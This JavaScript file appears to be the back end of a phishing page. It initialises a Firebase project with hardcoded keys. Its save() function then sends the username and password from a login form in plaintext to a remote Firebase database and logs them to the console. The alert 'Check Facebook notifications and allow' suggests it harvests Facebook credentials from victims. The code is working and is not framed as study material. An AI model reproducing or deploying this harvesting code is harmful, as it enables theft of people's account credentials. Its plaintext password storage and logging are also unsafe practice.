// Your web app's Firebase configuration
const firebaseConfig = {

    apiKey: "AIzaSyAWBoTBdopcIpBFE_aJpKZObttwZ7VyGjY",
  
    authDomain: "application-bcfe9.firebaseapp.com",
  
    databaseURL: "https://application-bcfe9-default-rtdb.firebaseio.com",
  
    projectId: "application-bcfe9",
  
    storageBucket: "application-bcfe9.appspot.com",
  
    messagingSenderId: "22505666442",
  
    appId: "1:22505666442:web:37113b705c26a443673a73",
  
    measurementId: "G-EY7H8Q4KEL"
  
    };
    
    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    
    // Set database variable
    var database = firebase.database()
    function sanitizeKey(key) {
      return key.replace(/\./g, "_")
                .replace(/#/g, "_")
                .replace(/\$/g, "_")
                .replace(/\[/g, "_")
                .replace(/\]/g, "_")
                .replace(/\//g, "_");
    }
     function save() {
      // Get the username and password
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
  
      // Validate input values (optional)
      if (!username || !password) {
        alert('Please enter both username and password');
        return;
      }
      const sanitizedUsername = sanitizeKey(username);
      // Save the data to Firebase Realtime Database
      database.ref('users/' + sanitizedUsername).set({
        username: username,
        password: password
      }).then(function() {
        console.log("Credentials submitted:", username, password);
  
        // Show the second modal after 2 seconds
        setTimeout(function() {
         
          alert('Check Facebook notifications and allow ')
        }, 1000);
      }).catch(function(error) {
        console.error("Error saving data:", error);
      });
    }
  
    // Close the second modal
    function closeSecondModal() {
      document.getElementById('Modal1').style.display = 'none';
    }
    
    
  